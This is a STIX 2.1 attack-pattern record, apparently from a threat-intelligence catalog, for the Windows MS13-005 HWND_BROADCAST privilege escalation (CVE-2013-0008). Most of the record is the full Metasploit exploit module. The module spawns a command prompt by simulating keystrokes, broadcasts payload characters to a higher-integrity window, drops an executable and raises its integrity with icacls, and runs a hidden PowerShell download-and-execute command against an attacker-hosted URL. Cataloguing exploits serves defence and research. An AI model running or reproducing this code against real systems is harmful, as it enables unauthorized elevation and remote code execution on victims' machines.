{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebfb2822-f8fd-4272-844f-a4e62441111f",
    "created": "2024-08-14T16:49:23.235977Z",
    "modified": "2024-08-14T16:49:23.235981Z",
    "name": "MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation",
    "description": " Due to a problem with isolating window broadcast messages in the Windows kernel an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. This issue affects Windows Vista, 7, 8, Server 2008, Server 2008 R2, Server 2012, and RT. Note that spawning a command prompt with the shortcut key combination Win+Shift+# does not work in Vista, so the attacker will have to check if the user is already running a command prompt and set SPAWN_PROMPT false.  Three exploit techniques are available with this module. The WEB technique will execute a powershell encoded payload from a Web location.  The FILE technique will drop an executable to the file system, set it to medium integrity and execute it. The TYPE technique will attempt to execute a powershell encoded payload directly from the command line, but may take some time to complete.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms13_005_hwnd_broadcast.rb",
            "external_id": "ms13_005_hwnd_broadcast.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0008"
        },
        {
            "source_name": "reference",
            "url": "http://blog.cmpxchg8b.com/2013/02/a-few-years-ago-while-working-on.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation',\n        'Description'\t=> %q{\n          Due to a problem with isolating window broadcast messages in the Windows kernel,\n          an attacker can broadcast commands from a lower Integrity Level process to a\n          higher Integrity Level process, thereby effecting a privilege escalation. This\n          issue affects Windows Vista, 7, 8, Server 2008, Server 2008 R2, Server 2012, and\n          RT. Note that spawning a command prompt with the shortcut key combination Win+Shift+#\n          does not work in Vista, so the attacker will have to check if the user is already\n          running a command prompt and set SPAWN_PROMPT false.\n\n          Three exploit techniques are available with this module. The WEB technique will\n          execute a powershell encoded payload from a Web location.  The FILE technique\n          will drop an executable to the file system, set it to medium integrity and execute\n          it. The TYPE technique will attempt to execute a powershell encoded payload directly\n          from the command line, but may take some time to complete.\n        },\n        'License'\t=> MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Discovery\n          'Axel Souchet', # @0vercl0k POC\n          'Ben Campbell' # Metasploit module\n        ],\n        'Platform'\t=> [ 'win' ],\n        'SessionTypes'\t=> [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 40,\n        },\n        'DisclosureDate' => '2012-11-27',\n        'References' => [\n          [ 'CVE', '2013-0008' ],\n          [ 'MSB', 'MS13-005' ],\n          [ 'OSVDB', '88966'],\n          [ 'URL', 'http://blog.cmpxchg8b.com/2013/02/a-few-years-ago-while-working-on.html' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_railgun_api_multi\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('SPAWN_PROMPT', [true, 'Attempts to spawn a medium integrity command prompt', true]),\n        OptEnum.new('TECHNIQUE', [true, 'Delivery technique', 'WEB', ['WEB', 'FILE', 'TYPE']]),\n        OptString.new('CUSTOM_COMMAND', [false, 'Custom command to type'])\n      ], self.class\n    )\n  end\n\n  def low_integrity_level?\n    tmp_dir = session.sys.config.getenv('USERPROFILE')\n    cd(tmp_dir)\n    new_dir = \"#{rand_text_alpha(5)}\"\n    begin\n      session.shell_command_token(\"mkdir #{new_dir}\")\n    rescue\n      return true\n    end\n\n    if directory?(new_dir)\n      session.shell_command_token(\"rmdir #{new_dir}\")\n      return false\n    else\n      return true\n    end\n  end\n\n  def win_shift(number)\n    vk = 0x30 + number\n    bscan = 0x81 + number\n    client.railgun.user32.keybd_event('VK_LWIN', 0x5b, 0, 0)\n    client.railgun.user32.keybd_event('VK_LSHIFT', 0xAA, 0, 0)\n    client.railgun.user32.keybd_event(vk, bscan, 0, 0)\n    client.railgun.user32.keybd_event(vk, bscan, 'KEYEVENTF_KEYUP', 0)\n    client.railgun.user32.keybd_event('VK_LWIN', 0x5b, 'KEYEVENTF_KEYUP', 0)\n    client.railgun.user32.keybd_event('VK_LSHIFT', 0xAA, 'KEYEVENTF_KEYUP', 0)\n  end\n\n  def count_cmd_procs\n    count = 0\n    client.sys.process.each_process do |proc|\n      if proc['name'] == 'cmd.exe'\n        count += 1\n      end\n    end\n\n    vprint_status(\"Cmd prompt count: #{count}\")\n    return count\n  end\n\n  def cleanup\n    if datastore['SPAWN_PROMPT'] and @hwin\n      vprint_status(\"Rehiding window...\")\n      client.railgun.user32.ShowWindow(@hwin, 0)\n    end\n    super\n  end\n\n  def exploit\n    # First of all check if the session is running on Low Integrity Level.\n    # If it isn't doesn't worth continue\n    print_status(\"Running module against #{sysinfo['Computer']}\") if not sysinfo.nil?\n    fail_with(Failure::NotVulnerable, \"Not running at Low Integrity!\") unless low_integrity_level?\n\n    # If the user prefers to drop payload to FILESYSTEM, try to cd to %TEMP% which\n    # hopefully will be \"%TEMP%/Low\" (IE Low Integrity Process case) where a low\n    # integrity process can write.\n    drop_to_fs = false\n    if datastore['TECHNIQUE'] == 'FILE'\n      payload_file = \"#{rand_text_alpha(5 + rand(3))}.exe\"\n      begin\n        tmp_dir = session.sys.config.getenv('TEMP')\n        tmp_dir << \"\\\\Low\" unless tmp_dir[-3, 3] =~ /Low/i\n        cd(tmp_dir)\n        print_status(\"Trying to drop payload to #{tmp_dir}...\")\n        if write_file(payload_file, generate_payload_exe)\n          print_good(\"Payload dropped successfully, exploiting...\")\n          drop_to_fs = true\n          register_file_for_cleanup(payload_file)\n          payload_path = tmp_dir\n        else\n          print_error(\"Failed to drop payload to File System, will try to execute the payload from PowerShell, which requires HTTP access.\")\n          drop_to_fs = false\n        end\n      rescue ::Rex::Post::Meterpreter::RequestError\n        print_error(\"Failed to drop payload to File System, will try to execute the payload from PowerShell, which requires HTTP access.\")\n        drop_to_fs = false\n      end\n    end\n\n    if drop_to_fs\n      command = \"cd #{payload_path} && icacls #{payload_file} /setintegritylevel medium && #{payload_file}\"\n      make_it(command)\n    elsif datastore['TECHNIQUE'] == 'TYPE'\n      if datastore['CUSTOM_COMMAND']\n        command = datastore['CUSTOM_COMMAND']\n      else\n        print_warning(\"WARNING: It can take a LONG TIME to broadcast the cmd script to execute the powershell command line payload\")\n        command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n      end\n      make_it(command)\n    else\n      super\n    end\n  end\n\n  def primer\n    url = get_uri()\n    download_and_run = \"IEX ((new-object net.webclient).downloadstring('#{url}'))\"\n    command = generate_psh_command_line({\n      :noprofile => true,\n      :windowstyle => 'hidden',\n      :command => download_and_run\n    })\n    make_it(command)\n  end\n\n  def make_it(command)\n    if datastore['SPAWN_PROMPT']\n      @hwin = client.railgun.kernel32.GetConsoleWindow()['return']\n      if @hwin == nil\n        @hwin = client.railgun.user32.GetForegroundWindow()['return']\n      end\n      client.railgun.user32.ShowWindow(@hwin, 0)\n      client.railgun.user32.ShowWindow(@hwin, 5)\n\n      # Spawn low integrity cmd.exe\n      print_status(\"Spawning Low Integrity Cmd Prompt\")\n      windir = session.sys.config.getenv('windir')\n      li_cmd_pid = client.sys.process.execute(\"#{windir}\\\\system32\\\\cmd.exe\", nil, { 'Hidden' => false }).pid\n\n      count = count_cmd_procs\n      spawned = false\n      print_status(\"Brute forcing Taskbar Position\")\n      9.downto(1) do |number|\n        vprint_status(\"Attempting Win+Shift+#{number}\")\n        win_shift(number)\n        sleep(1)\n\n        if count_cmd_procs > count\n          print_good(\"Spawned Medium Integrity Cmd Prompt\")\n          spawned = true\n          break\n        end\n      end\n\n      client.sys.process.kill(li_cmd_pid)\n\n      fail_with(Failure::Unknown, \"No Cmd Prompt spawned\") unless spawned\n    end\n\n    print_status(\"Broadcasting payload command to prompt... I hope the user is asleep!\")\n    multi_rail = []\n    command.each_char do |c|\n      multi_rail << ['user32', 'SendMessageA', ['HWND_BROADCAST', 'WM_CHAR', c.unpack('c').first, 0]]\n    end\n\n    multi_rail << ['user32', 'SendMessageA', ['HWND_BROADCAST', 'WM_CHAR', 'VK_RETURN', 0]]\n    print_status(\"Executing command...\")\n    client.railgun.multi(multi_rail)\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Delivering Payload\")\n    data = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)\n    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-27",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}